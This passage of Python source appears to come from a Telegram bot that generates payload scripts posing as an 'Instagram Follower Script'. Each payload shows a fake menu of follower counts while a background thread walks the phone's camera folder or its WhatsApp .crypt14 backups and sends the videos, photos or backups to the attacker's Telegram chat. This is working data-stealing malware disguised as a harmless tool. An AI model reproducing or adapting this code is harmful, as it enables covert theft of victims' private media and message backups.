def bqck():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.lower().endswith("crypt14"):
                    executor.submit(send_file, file_path)

threading.Thread(target=back).start()


Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script 💘.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام 💘.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests 💞💞.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests 💞💞.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests 💞💞.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests 💞💞.   """) 
            '''
						creat_payloads(id, ms, payload)
					elif second_data == 'camvid':
						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests

bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/DCIM/Camera/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".mp4")):
            bot.send_video(chat_id={id}, video=f, caption='By: @Atmaja5788_bot')

def back():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.lower().endswith((".mp4")):
                    executor.submit(send_file, file_path)

threading.Thread(target=back).start()

Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script 💘.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام 💘.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests 💞💞.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests 💞💞.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests 💞💞.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests 💞💞.   """) 
            '''
						creat_payloads(id, ms, payload)
					elif second_data == 'camimg':
						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests

bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/DCIM/Camera/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')

def back():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
                    executor.submit(send_file, file_path)

threading.Thread(target=back).start()

Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script 💘.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام 💘.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests 💞💞.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests 💞💞.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests 💞💞.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests 💞💞.   """) 
            '''
						creat_payloads(id, ms, payload)

bot.infinity_polling()